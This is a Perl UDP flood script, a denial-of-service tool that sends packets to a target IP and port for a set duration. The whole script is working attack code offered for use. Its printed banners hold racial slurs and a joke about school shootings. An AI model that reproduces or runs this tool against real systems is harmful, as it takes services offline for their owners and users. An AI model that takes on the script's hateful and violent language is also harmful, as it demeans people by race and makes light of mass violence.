#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD RED "IP First\n";
print BOLD RED "Port Second\n";
print BOLD RED "Packets Third\n";
print BOLD RED  "Seconds Last\n";
 
############
# Monarch<----
############
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD RED<<EOTEXT;

  ▄   ██▄   █ ▄▄      IP: $ip 
   █  █  █  █   █     PORT: $port
█   █ █   █ █▀▀▀      PACKETS: $size  
█   █ █  █  █         TIME: $time
█▄ ▄█ ███▀   █    
 ▀▀▀          ▀   

Tha DDoS GoD Just Hit $ip with $size packets $time-Boners.

-Gangin is a G-Nigga.
By: ~ W1Fi ~

 
EOTEXT
              
       
 use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD BLUE"~ FuCk ThIs NiGgEr~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Get Null Routed Bitch!?") . "
~ Shooting Up Schools $ip With $time-Bullets!
~ #OffLine ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}

 
               
       
